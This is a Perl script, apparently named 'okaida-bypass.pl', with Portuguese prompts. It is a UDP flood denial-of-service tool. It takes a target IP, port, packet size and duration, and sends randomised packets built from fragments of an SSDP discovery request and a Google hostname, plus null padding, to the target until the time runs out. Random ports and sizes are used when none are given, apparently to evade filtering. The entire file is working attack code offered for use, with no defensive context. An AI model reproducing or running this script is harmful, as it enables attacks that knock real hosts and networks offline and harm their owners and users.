use Socket;
use strict;

if ($#ARGV != 3) {
print "
 _______ __           __     __               __                                       ______    ______ 
|       |  |--.---.-.|__|.--|  |.---.-.______|  |--.--.--.-----.---.-.-----.-----.    |__    |  |      |
|   -   |    <|  _  ||  ||  _  ||  _  |______|  _  |  |  |  _  |  _  |__ --|__ --|    |__    |__|  --  |
|_______|__|__|___._||__||_____||___._|      |_____|___  |   __|___._|_____|_____|    |______|__|______|
                                                   |_____|__|                                           

[?] <okaida-bypass.pl> <IP> <PORTA> <PSize> <Tempo>
";
exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);

	my @hex =("\x4d", "\x2d", "\x53", "\x45", "\x41", "\x52", "\x43", "\x48", "\x20", "\x2a", "\x20", "\x48", "\x54", "\x54", "\x50", "\x2f", "\x31", "\x2e", "\x31", "\x0d", "\x0a", "\x48", "\x4f", "\x53", "\x54", "\x3a", "\x20", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x2e", "\x32", "\x35", "\x35", "\x3a", "\x31", "\x39", "\x30", "\x30", "\x0d", "\x0a", "\x4d", "\x41", "\x4e", "\x3a", "\x20", "\x22", "\x73", "\x73", "\x64", "\x70", "\x3a", "\x64", "\x69", "\x73", "\x63", "\x6f", "\x76", "\x65", "\x72", "\x22", "\x0d", "\x0a", "\x4d", "\x58", "\x3a", "\x20", "\x31", "\x0d", "\x0a", "\x53", "\x54", "\x3a", "\x20", "\x75", "\x72", "\x6e","\x3a", "\x64", "\x69", "\x61", "\x6c", "\x2d", "\x6d", "\x75", "\x6c", "\x74", "\x69", "\x73", "\x63", "\x72", "\x65", "\x65", "\x6e", "\x2d", "\x6f", "\x72", "\x67", "\x3a", "\x73", "\x65", "\x72", "\x76", "\x69", "\x63", "\x65", "\x3a", "\x64", "\x69", "\x61", "\x6c", "\x3a", "\x31", "\x0d", "\x0a", "\x55", "\x53", "\x45", "\x52", "\x2d", "\x41", "\x47", "\x45", "\x4e", "\x54", "\x3a", "\x20", "\x47", "\x6f", "\x6f", "\x67", "\x6c", "\x65", "\x20", "\x43", "\x68", "\x72", "\x6f", "\x6d", "\x65", "\x2f", "\x36", "\x30", "\x2e", "\x30", "\x2e", "\x33", "\x31", "\x31", "\x32", "\x2e", "\x39", "\x30", "\x20", "\x57", "\x69", "\x6e", "\x64", "\x6f", "\x77", "\x73", "\x0d", "\x0a", "\x0d", "\x0a");
	my @hex2 =("\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0", "\xC2", "\xA0");
	my @hex3 =("\x2A", "\x2E", "\x67", "\x6F", "\x6F", "\x67", "\x6C", "\x65", "\x2E", "\x63", "\x6F", "\x6D");

			$iaddr = inet_aton("$ip") or die "Erro!\n";
			$endtime = time() + ($time ? $time : 1000000);
		
	socket(flood, PF_INET, SOCK_DGRAM, 17);

print"
[!] Atacando $ip, na porta $port, por $time segundos.	
";

	for (; time() <= $endtime;) {

		$psize = $size ? $size : int(rand(1500 - 64) + 64);
		$pport = $port ? $port : int(rand(65500)) + 1;

	send(flood, $hex[rand @hex].$hex[rand @hex].$hex[rand @hex].$hex[rand @hex]. "\x00" .$hex2[rand @hex2].$hex2[rand @hex2].$hex2[rand @hex2]. "\x00" .$hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3].$hex3[rand @hex3].pack("x$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));

}